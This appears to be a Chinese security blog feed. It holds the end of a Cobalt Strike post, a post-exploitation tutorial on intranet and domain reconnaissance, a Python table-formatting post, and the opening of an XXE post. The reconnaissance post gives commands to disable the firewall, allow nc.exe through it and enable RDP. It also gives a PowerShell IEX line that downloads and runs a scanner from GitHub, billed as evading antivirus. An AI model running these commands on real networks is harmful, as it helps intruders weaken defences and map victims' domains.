Strike中它的心跳默认是60s（即sleep时间为60s，每一分钟目标主机与teamserver通信一次）</li><li>这会让我们执行命令或进行其他操作响应很慢。</li><li>如果sleep时间过长，在下载文件面前更为明显，所以在测试时会把时间降低一点 。</li><li>我一般先执行sleep 5 ，让相应快一点，但是建议不要太快。如果有下载或者远程VNC这种需要快速网络的 可直接 sleep 0</li></ul><p><img src="https://img-blog.csdnimg.cn/20200315185635329.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网安全学习从入门到入狱-知识-内网信息探测与收集</title>
      <link href="/2020/03/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B%E4%B8%8E%E6%94%B6%E9%9B%86/"/>
      <url>/2020/03/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B%E4%B8%8E%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="内网安全学习从入门到入狱-知识-内网信息收集"><a href="#内网安全学习从入门到入狱-知识-内网信息收集" class="headerlink" title="内网安全学习从入门到入狱-知识-内网信息收集"></a>内网安全学习从入门到入狱-知识-内网信息收集</h1><h3 id="内网信息收集-工作组和域内基本信息收集"><a href="#内网信息收集-工作组和域内基本信息收集" class="headerlink" title="内网信息收集-工作组和域内基本信息收集"></a>内网信息收集-工作组和域内基本信息收集</h3><ul><li><p><a href="#_1">内网安全学习从入门到入狱-知识-内网信息收集</a></p></li><li><ul><li><a href="#0x01_14">0x01本机检查–先看看我是谁</a></li><li><ul><li><a href="#_146">查询并开启远程连接服务</a></li></ul></li><li><a href="#0x02_212">0x02域内信息收集</a></li><li><ul><li><a href="#_214">查询当前额权限</a></li><li><a href="#_230">判断是否有域</a></li><li><a href="#_259">查找域控</a></li><li><ul><li><ul><li><a href="#_275">获取域内的用户信息</a></li></ul></li></ul></li></ul></li><li><a href="#0x03__290">0x03 域内网存活主机的探测</a></li><li><ul><li><a href="#_292">主机存活扫描</a></li><li><a href="#_342">域内端口扫描</a></li><li><ul><li><a href="#PowerSploit__InvokePortscanps1__352">PowerSploit 中的 Invoke-Portscan.ps1 脚本</a></li></ul></li></ul></li></ul></li><li><p>前提准备</p></li></ul><p>本文中PowerShell脚本可以自行下载</p><p><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p><h2 id="0x01本机检查–先看看我是谁"><a href="#0x01本机检查–先看看我是谁" class="headerlink" title="0x01本机检查–先看看我是谁"></a>0x01本机检查–先看看我是谁</h2><p>域内的主机一般都是批量的，所以我们看看我们自己，基本上大家也就是差不多的情况</p><p>先看看ip，看看网卡，内外网情况，IP段记录一下，DNS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br></pre></td></tr></table></figure><p>查看用户列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p>查看在线的用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020031412103628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><p>查看本机管理员</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314121107827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>看管理员进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist &#x2F;v</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314121140190.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><p>域管理进程 <code>hack\adminishtartor</code></p><p><img src="https://img-blog.csdnimg.cn/20200314121211226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>还有一些常见杀软</p><table><thead><tr><th>360sd…EXE</th><th>360</th></tr></thead><tbody><tr><td>360tray.EXE</td><td>360</td></tr><tr><td>ZHUDONGFANGYU.EXE</td><td>360</td></tr><tr><td>KSAFETRAY.EXE</td><td>金山</td></tr><tr><td>MACAFEE MCSHIELD.EXE</td><td>MacAfee</td></tr><tr><td>AVP.EXE</td><td>K卡巴斯基</td></tr><tr><td>AVGGUARD.EXE</td><td>小红伞</td></tr><tr><td>EGUI.EXE</td><td>Nod32</td></tr></tbody></table><ul><li>查看进程 too</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><ul><li>查看端口</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo  或者 wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><ul><li><p>查看共享列表</p><ul><li></li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net share           wmic share get name,path,status</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314121255249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><p>（1）关闭防火墙<br>Windows Server 2003 系统及之前版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure><p>Windows Server 2003 之后系统版本，命令如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><ul><li>修改防火墙配置<br>Windows Server 2003 系统及之前版本，允许指定程序全部连接，命令如下。<br>netsh firewall add allowedprogram c:\nc.exe “allow nc” enable<br>Windows Server 2003 之后系统版本，情况如下。<br> 允许指定程序连入，命令如下。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow </span><br><span class="line">program&#x3D;&quot;C: \nc.exe&quot;</span><br></pre></td></tr></table></figure><p> 允许指定程序连出，命令如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Allow nc&quot; dir&#x3D;out action&#x3D;allow </span><br><span class="line">program&#x3D;&quot;C: \nc.exe&quot;</span><br></pre></td></tr></table></figure><p>允许 3389 端口放行，命令如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in </span><br><span class="line">  localport&#x3D;3389 action&#x3D;allow</span><br></pre></td></tr></table></figure><h3 id="查询并开启远程连接服务"><a href="#查询并开启远程连接服务" class="headerlink" title="查询并开启远程连接服务"></a>查询并开启远程连接服务</h3><p>查看远程连接端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;V PortNumber</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314121448325.png" alt="在这里插入图片描述"></p><p>在 Windows Server 2003 中开启 3389 端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure><p>在 Windows Server 2008 和 Windows Server 2012 中开启 3389 端口</p><p>一般前两个命令就开启了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName&#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; &#x2F;v fSingleSessionPerUser &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314121512501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="12"></p><p>查询域控制器列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Net group &quot;Domain Controller&quot; &#x2F;domain</span><br></pre></td></tr></table></figure><p>收集管理员列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Net group &quot;Domain admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020031412153313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><ul><li>列出或断开本地计算机和连接的客户端的会话</li><li><code>net session</code></li><li></li></ul><h2 id="0x02域内信息收集"><a href="#0x02域内信息收集" class="headerlink" title="0x02域内信息收集"></a>0x02域内信息收集</h2><h3 id="查询当前额权限"><a href="#查询当前额权限" class="headerlink" title="查询当前额权限"></a>查询当前额权限</h3><ul><li>获取域 SID</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami  &#x2F;all</span><br></pre></td></tr></table></figure><ul><li>查询指定账户的详细信息。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user XXX &#x2F;domain</span><br></pre></td></tr></table></figure><ul><li><h3 id="判断是否有域"><a href="#判断是否有域" class="headerlink" title="判断是否有域"></a>判断是否有域</h3></li></ul><p>主要利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ifconfig &#x2F;all</span><br><span class="line">systeminfo</span><br><span class="line">net view &#x2F;domain   查询域</span><br><span class="line">net view &#x2F;domain:XXX    查询此域内所有计算机</span><br><span class="line">net group &#x2F;domain查询域内所有用户</span><br><span class="line">net config workstation</span><br><span class="line">net time &#x2F;domain</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314121609472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain computers&quot; &#x2F;domain   查询所有域成员计算机</span><br><span class="line"></span><br><span class="line">net accounts &#x2F;domain  获取域密码信息</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这个在大型内网，多个域很重要</span><br><span class="line">获取域信任信息</span><br><span class="line"></span><br><span class="line">nltest &#x2F;domain_trusts</span><br></pre></td></tr></table></figure><h3 id="查找域控"><a href="#查找域控" class="headerlink" title="查找域控"></a>查找域控</h3><p>可以看到域控制器机器名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest &#x2F;DCLIST:hack</span><br></pre></td></tr></table></figure><p>查看域控制器的主机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nslookup -type&#x3D;SRV _ldap._tcp</span><br></pre></td></tr></table></figure><h5 id="获取域内的用户信息"><a href="#获取域内的用户信息" class="headerlink" title="获取域内的用户信息"></a>获取域内的用户信息</h5><p>获取域内用户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user &#x2F;domain</span><br></pre></td></tr></table></figure><p>查看存在用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery user</span><br></pre></td></tr></table></figure><h2 id="0x03-域内网存活主机的探测"><a href="#0x03-域内网存活主机的探测" class="headerlink" title="0x03 域内网存活主机的探测"></a>0x03 域内网存活主机的探测</h2><h3 id="主机存活扫描"><a href="#主机存活扫描" class="headerlink" title="主机存活扫描"></a>主机存活扫描</h3><p>内网探测要点</p><ul><li>避免使用大流量攻击的软件和图形化的东西</li><li>避免杀软敏感操作</li><li>尽量使用系统自带的组件</li><li>上班和下班多次扫描，可以进行对比网络情况</li></ul><p>1.利用netbios快速探测内网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Netbios.exe 192.168.0.1&#x2F;24</span><br></pre></td></tr></table></figure><p>2.利用 ICMP 协议快速探测内网—-ping命令主要使用—有的ping不通很正常</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL&#x3D;&quot;</span><br></pre></td></tr></table></figure><p>3.通过 ARP 扫描探测内网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">arp-scan 工具</span><br><span class="line">Arp.exe –t 192.168.1.0&#x2F;20     </span><br><span class="line"></span><br><span class="line">Nishang 中的 Invoke-ARPScan.ps1扫描</span><br><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\windows\temp\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.1.0&#x2F;24&#125;&quot; &gt;&gt; C:\windows\temp\log.txt</span><br><span class="line"></span><br><span class="line">Empire 中的 arpsan 模块</span><br><span class="line">usemodule situational_awareness&#x2F;network&#x2F;arpscan</span><br><span class="line">set Range 192.168.1.0-192.168.0.254</span><br><span class="line">execute</span><br></pre></td></tr></table></figure><p>4.利用TCP UDP工具扫描</p><p>ScanLine 是一款经典的端口扫描工具 体积小，动静小</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanline -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O c:\windows\temp\log.txt -p 192.168.1.1-254 &#x2F;b</span><br></pre></td></tr></table></figure><h3 id="域内端口扫描"><a href="#域内端口扫描" class="headerlink" title="域内端口扫描"></a>域内端口扫描</h3><p>建议 wmi和powershell工具 动静小好</p><p>S扫描器</p><p>Metasploit 包含多种端口扫描技术，与其他扫描工具接口良好。在 msfconsole 下运行“search portscan”命令，即可进行搜索。</p><h4 id="PowerSploit-中的-Invoke-Portscan-ps1-脚本"><a href="#PowerSploit-中的-Invoke-Portscan-ps1-脚本" class="headerlink" title="PowerSploit 中的 Invoke-Portscan.ps1 脚本"></a>PowerSploit 中的 Invoke-Portscan.ps1 脚本</h4><p>这个强大之处在于是无文件落地的扫描，很强大，</p><p>可以绕过一些杀软</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主要机子要联网能连接到 GitHub这个地址</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Recon&#x2F;Invoke-Portscan.ps1&#39;);Invoke-Portscan -Hosts 192.168.1.0&#x2F;24 -T 4 -ports &#39;445,1433,8080,3389,80&#39; -oA c:\windows\temp\res.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314121643894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="12"><br><img src="https://img-blog.csdnimg.cn/20200314121717799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python中prettytable输出美化再加进度条</title>
      <link href="/2020/03/10/Python%E4%B8%ADprettytable%E8%BE%93%E5%87%BA%E7%BE%8E%E5%8C%96%E5%86%8D%E5%8A%A0%E8%BF%9B%E5%BA%A6%E6%9D%A1/"/>
      <url>/2020/03/10/Python%E4%B8%ADprettytable%E8%BE%93%E5%87%BA%E7%BE%8E%E5%8C%96%E5%86%8D%E5%8A%A0%E8%BF%9B%E5%BA%A6%E6%9D%A1/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="Python通过prettytable模块将输出内容如表格输出-比自己那个高端的多了"><a href="#Python通过prettytable模块将输出内容如表格输出-比自己那个高端的多了" class="headerlink" title="- Python通过prettytable模块将输出内容如表格输出 比自己那个高端的多了"></a>- Python通过prettytable模块将输出内容如表格输出 比自己那个高端的多了</h2><ul><li>而且十分简单的使用</li></ul><p>1安装得有吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install PrettyTable</span><br></pre></td></tr></table></figure><p>2导入模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import prettytable as pt</span><br></pre></td></tr></table></figure><p>直接给例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import prettytable as pt</span><br><span class="line"></span><br><span class="line"># 添加表头</span><br><span class="line">table &#x3D; pt.PrettyTable([&quot;URL&quot;, &quot;参数&quot;, &quot;沙雕&quot;])</span><br><span class="line"></span><br><span class="line">#   add_row 添加一行数据</span><br><span class="line">table.add_row([&quot;http:&#x2F;&#x2F;aaa.com&quot;, &quot;raskv&quot;, &quot;123123&quot;])</span><br><span class="line">table.add_row([&quot;http:&#x2F;&#x2F;bbb.com&quot;, &quot;susd&quot;, &quot;123123&quot;])</span><br><span class="line">table.add_row([&quot;http:&#x2F;&#x2F;ccc.com&quot;, &quot;pwd&quot;, &quot;Ym15&quot;])</span><br><span class="line"></span><br><span class="line">#   默认居中对齐</span><br><span class="line">#   设置&quot;值&quot;列，局左对齐 left首字母</span><br><span class="line">table.align[&quot;值&quot;] &#x3D; &#39;l&#39;</span><br><span class="line"></span><br><span class="line">print(table)</span><br></pre></td></tr></table></figure><p>输出，可以哇<br><img src="https://img-blog.csdnimg.cn/20200310182731777.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from prettytable import PrettyTable</span><br><span class="line"></span><br><span class="line">table &#x3D; PrettyTable()</span><br><span class="line">#   add_column 添加一列数据</span><br><span class="line">table.add_column(&#39;&#x3D;&#x3D;&#x3D;&#39;, [&quot;URL&quot;, &quot;参数&quot;, &quot;值&quot;])</span><br><span class="line">table.add_column(&#39;第1列&#39;, [&quot;http:&#x2F;&#x2F;aaa.com&quot;, &quot;raskv&quot;, &quot;dEBxcS5j&quot;])</span><br><span class="line">table.add_column(&#39;第2列&#39;, [&quot;http:&#x2F;&#x2F;bbb.com&quot;, &quot;su&quot;, &quot;626d5633583231794c6d4e6&quot;])</span><br><span class="line">table.add_column(&#39;第3列&#39;, [&quot;http:&#x2F;&#x2F;ccc.com&quot;, &quot;pwd&quot;, &quot;Ym1WM1gyMXlMbU5&quot;])</span><br><span class="line">#   设置&quot;第3列&quot;，局右对齐 right首字母</span><br><span class="line">table.align[&quot;第3列&quot;] &#x3D; &#39;r&#39;</span><br><span class="line">print(table)</span><br></pre></td></tr></table></figure><h2 id="进度条"><a href="#进度条" class="headerlink" title="进度条"></a>进度条</h2><p>import time<br>import progressbar</p><h1 id="可以是迭代器或列表"><a href="#可以是迭代器或列表" class="headerlink" title="可以是迭代器或列表"></a>可以是迭代器或列表</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; progressbar.ProgressBar()</span><br><span class="line"></span><br><span class="line">my_list &#x3D; [1, 2, 3, 4, 5]</span><br><span class="line">my_list.append([6, 7, 8, 9])</span><br><span class="line"></span><br><span class="line">for i in p(my_list):</span><br><span class="line">    # do something</span><br><span class="line">    print(i)</span><br><span class="line">    time.sleep(1)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞攻防</title>
      <link href="/2020/03/08/XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E9%98%B2/"/>
      <url>/2020/03/08/XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E9%98%B2/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><h2 id="1-XXE概述"><a href="#1-XXE概述" class="headerlink" title="1. XXE概述"></a>1. XXE概述</h2><p>XXE（XML External Entity Injection）即XML外部实体注入。漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。</p><p>可以造成危害</p><ul><li>文件读取</li><li>ssrf</li><li>dos</li><li>命令执行</li></ul><h2 id="XML基础介绍"><a href="#XML基础介绍" class="headerlink" title="XML基础介绍"></a>XML基础介绍</h2><p>XML是可扩展的标记语言（eXtensible Markup Language），设计用来进行数据的传输和存储。</p><p>下面我们主要介绍PHP语言下的XXE攻击.</p><h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><p>例子</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span>  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p><strong>文档类型定义（DTD）</strong></p><p>可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><ul><li><p>内部的 DOCTYPE 声明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 